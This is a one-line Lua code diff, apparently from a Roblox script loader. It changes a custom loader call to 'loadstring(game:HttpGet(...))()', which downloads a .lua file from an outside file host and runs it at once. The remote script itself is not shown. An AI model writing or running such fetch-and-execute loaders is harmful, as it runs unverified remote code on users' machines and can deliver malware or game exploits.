@@ -1,1 +1,1 @@
-loadYunLuaGroup("https://www.mpimg.cn/down.php/e445edb4585b6c12ab2612abd53b4b41.lua")
+loadstring(game:HttpGet("https://www.mpimg.cn/down.php/e445edb4585b6c12ab2612abd53b4b41.lua"))()
